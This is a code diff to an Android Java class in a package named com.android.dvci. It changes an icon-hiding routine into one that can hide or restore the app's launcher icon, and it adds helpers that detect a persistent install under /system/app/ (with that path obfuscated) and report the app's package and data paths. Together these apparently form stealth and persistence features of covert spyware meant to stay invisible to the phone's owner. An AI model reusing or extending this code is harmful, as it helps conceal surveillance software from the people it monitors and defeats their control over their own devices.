@@ -10,6 +10,7 @@ package com.android.dvci;
 import android.content.ComponentName;
 import android.content.ContentResolver;
 import android.content.Context;
+import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Handler;
@@ -19,6 +20,7 @@ import android.widget.Toast;
 
 import com.android.dvci.action.Action;
 import com.android.dvci.auto.Cfg;
+
 import com.android.dvci.conf.ConfEvent;
 import com.android.dvci.conf.ConfModule;
 import com.android.dvci.conf.Globals;
@@ -94,6 +96,7 @@ public class Status {
 	static public boolean uninstall;
 
 	static WakeLock wl;
+	private static String apkName;
 	private final Date startedTime = new Date();
 
 	private boolean deviceAdmin;
@@ -831,20 +834,42 @@ public class Status {
 			return false;
 		}
 	}
-	static public void hideIcon() {
+	static public void setIconState(Boolean hide) {
 		// Nascondi l'icona (subito in android 4.x, al primo reboot
 		// in android 2.x)
 		PackageManager pm = Status.self().getAppContext().getPackageManager();
 		ComponentName cn = new ComponentName(Status.self().getAppContext().getPackageName(),ASG.class.getCanonicalName());
 		int i=pm.getComponentEnabledSetting(cn);
-		if(i != PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " YEAHH Hide ICON for:"+cn);//$NON-NLS-1$
+		if ( hide ) {
+			if (i != PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " YEAHH Hide ICON for:" + cn);//$NON-NLS-1$
+				}
+				pm.setComponentEnabledSetting(cn, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+						PackageManager.DONT_KILL_APP);
 			}
-			pm.setComponentEnabledSetting(cn, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-					PackageManager.DONT_KILL_APP);
+		}else{
+			if (i == PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " RESTORE ICON for:" + cn);//$NON-NLS-1$
+				}
+				pm.setComponentEnabledSetting(cn, PackageManager.COMPONENT_ENABLED_STATE_DEFAULT,
+						PackageManager.DONT_KILL_APP);
+			}
 		}
-
+	}
+	public static PackageInfo getMyPackageInfo() {
+		PackageInfo pi = null;
+		PackageManager pm = Status.self().getAppContext().getPackageManager();
+		try {
+			pi = pm.getPackageInfo( Status.self().getAppContext().getPackageName(),0);
+		} catch (PackageManager.NameNotFoundException e) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (getMyPackageInfo) error:" + e);
+			}
+			return null;
+		}
+		return pi;
 	}
 
 	public boolean haveCamera() {
@@ -853,5 +878,54 @@ public class Status {
 			haveCamera = checkCameraHardware()?1:0;
 		}
 		return haveCamera == 1;
+	}
+
+	/*
+	 * return true if we did a persisten installation and
+	 * apk name contained in applicationInfo.sourceDir mismatch
+	 * with the new one , in that case a reboot is needed to
+	 * align the two info.
+	 */
+	public static Boolean needReboot(){
+		PackageInfo pi = null;
+		if ((pi=getMyPackageInfo())!=null) {
+			if (apkName != null && !pi.applicationInfo.sourceDir.equals(apkName)) {
+				return true;
+			}
+		}
+		return false;
+	}
+	public static String getApkName() {
+		PackageInfo pi = null;
+		if ((pi=getMyPackageInfo())!=null) {
+			if(apkName != null && !pi.applicationInfo.sourceDir.equals(apkName)){
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (getApkName): running app not updated with new pkg " + apkName + "still know " + pi.applicationInfo.sourceDir);
+				}
+				return apkName;
+			}else {
+				return pi.applicationInfo.sourceDir;
+			}
+		}
+		return null;
+	}
+
+	public static String getAppDir() {
+		PackageInfo pi = null;
+		if ((pi=getMyPackageInfo())!=null) {
+				return pi.applicationInfo.dataDir;
+		}
+		return null;
+	}
+	public static void setApkName(String apkNamePers) {
+		apkName = apkNamePers;
+	}
+
+	public static Boolean isPersistent() {
+		String apkName = getApkName();
+		if (apkName!=null){
+			return apkName.contains(M.e("/system/app/"));
+		}
+		return false;
 	}
 }
